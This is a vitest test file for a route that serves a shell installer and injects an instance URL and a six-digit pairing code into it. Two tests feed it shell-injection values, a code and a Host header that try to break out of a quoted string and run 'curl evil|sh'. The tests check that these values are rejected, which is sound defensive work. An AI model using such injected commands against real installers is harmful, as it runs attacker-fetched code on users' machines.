import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { GET } from "./route";

const canonical = () => readFile(resolve(process.cwd(), "../../install.sh"), "utf8");

function request(url: string, headers: Record<string, string> = {}): Request {
  return new Request(url, { headers: { host: "board.example", ...headers } });
}

describe("GET /install.sh", () => {
  it("serves the canonical root installer as shell text", async () => {
    const response = await GET(request("https://board.example/install.sh"));

    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toContain("text/x-shellscript");
    expect(await response.text()).toBe(await canonical());
    expect(response.headers.get("cache-control")).toBe("public, max-age=300");
  });
});

describe("GET /install.sh?code=NNNNNN", () => {
  it("answers the instance and the code the script would otherwise ask for", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();

    expect(body).toContain('PILOTDECK_INSTANCE_URL="${PILOTDECK_INSTANCE_URL:-https://board.example}"');
    expect(body).toContain('PILOTDECK_PAIRING_CODE="${PILOTDECK_PAIRING_CODE:-482913}"');
    expect(body).toContain("export PILOTDECK_INSTANCE_URL PILOTDECK_PAIRING_CODE");
  });

  it("keeps the shebang first, so a saved copy is still executable", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();

    expect(body.split("\n")[0]).toBe("#!/usr/bin/env bash");
  });

  it("leaves the rest of the installer byte-for-byte alone", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();
    const original = await canonical();

    // Everything the installer is, minus its shebang, has to survive intact:
    // the route presents the script, it does not get to rewrite it.
    expect(body).toContain(original.slice(original.indexOf("\n") + 1));
  });

  it("never lets a proxy hand the same single-use code to the next caller", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    expect(response.headers.get("cache-control")).toBe("no-store, private");
  });

  it("follows the forwarded scheme, because the command it builds is a URL we own", async () => {
    const response = await GET(
      request("http://board.example/install.sh?code=482913", { "x-forwarded-proto": "https, http" }),
    );
    expect(await response.text()).toContain("https://board.example");
  });

  it("treats a bare localhost as http, the one case that is not TLS", async () => {
    const response = await GET(
      request("http://localhost:3000/install.sh?code=482913", { host: "localhost:3000" }),
    );
    expect(await response.text()).toContain("http://localhost:3000");
  });

  it("ignores anything that is not exactly six digits", async () => {
    const original = await canonical();
    for (const code of ["", "12345", "1234567", "abcdef", "12345a", '1"; curl evil #']) {
      const response = await GET(
        request(`https://board.example/install.sh?code=${encodeURIComponent(code)}`),
      );
      expect(await response.text()).toBe(original);
    }
  });

  it("refuses to write a host that could break out of the shell string", async () => {
    const original = await canonical();
    const response = await GET(
      request("https://board.example/install.sh?code=482913", {
        host: 'board.example";curl evil|sh;#',
      }),
    );
    expect(await response.text()).toBe(original);
  });
});
